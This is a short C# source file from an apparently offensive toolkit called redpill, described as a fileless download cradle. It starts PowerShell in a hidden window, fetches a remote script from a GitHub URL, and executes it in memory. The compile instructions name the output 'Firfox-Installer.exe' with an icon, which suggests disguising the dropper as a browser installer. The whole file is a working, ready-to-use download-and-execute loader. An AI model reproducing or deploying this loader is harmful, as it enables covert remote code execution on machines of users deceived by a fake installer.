/*
   Author: @r00t-3xp10it
   redpill v1.2.6 - CsOnTheFly Internal Module!

   Title: StandAlone executable fileless cmdlet's download crandle.
   Description: Program.CS (to be compiled to standalone executable) that allow users to fileless download\execute external URL's cmdlet's
 
   Compile: .\CsOnTheFly.ps1 -action "compile" -uri "CScrandle.cs" -outfile "Firfox-Installer.exe" -iconset true
*/

using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var filePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

           Process process = new Process();
           process.StartInfo.FileName = filePath;
           process.StartInfo.Arguments = "$Proxy=New-Object -ComObject MsXml2.ServerXmlHttp;$Proxy.Open('GET','https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/test.ps1',0);$Proxy.Send();[scriptblock]::Create($Proxy.ResponseText).Invoke()";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}
